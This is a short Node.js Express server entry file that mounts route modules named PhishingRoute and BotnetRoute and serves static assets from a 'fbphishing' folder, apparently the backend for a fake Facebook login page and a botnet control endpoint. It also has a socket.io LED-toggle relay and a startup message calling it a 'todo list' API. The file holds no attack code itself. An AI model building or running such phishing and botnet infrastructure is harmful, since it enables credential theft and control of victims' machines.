/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

var express = require("express"),
  app = express(),
  port = process.env.PORT || 3000;
var server = require("http").createServer(app);
var io = require("socket.io")(server);
var colors = require("colors");
bodyParser = require("body-parser");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
var dbUtil = require("./api/service/DbUtilities");
dbUtil.init();

//create array global
global.tokenList = [];

var routes = require("./api/route/AuthRoute"); //importing route
var phishingRoute = require("./api/route/PhishingRoute");
phishingRoute(app);
var BotnetRoutes = require("./api/route/BotnetRoute"); //importing route
BotnetRoutes(app);
routes(app); //register the route
app.use(
  "/fbPhising_files",
  express.static("./api/views/pages/fbphishing/fbPhising_files")
);
app.use(express.static(__dirname + '/public'));

io.on('connection', function (socket) {
        console.log('New client connect'.gray);
    
        socket.on('led-change', function(data) {
            console.log(data);
            console.log(data.pin+'---'+data.status);
            io.sockets.emit('led-change', data);
        });
        socket.on('disconnect', function () {
            console.log('Client disconnect'.gray);
        });
    });
app.listen(port);

console.log("todo list RESTful API server started on: " + port);
